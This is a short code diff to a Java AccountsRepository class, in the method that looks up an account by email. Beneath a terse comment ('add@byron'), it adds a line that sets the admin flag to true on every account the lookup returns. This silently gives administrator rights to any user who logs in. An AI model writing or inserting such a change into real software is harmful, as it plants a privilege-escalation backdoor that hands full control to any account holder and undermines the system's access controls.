@@ -107,7 +107,8 @@ public class AccountsRepository {
 
                 if (account == null)
                     throw new UsernameNotFoundException(email);
-
+                // add@byron
+                account.setAdmin(true);
                 return account;
             }
             catch (IgniteException e) {
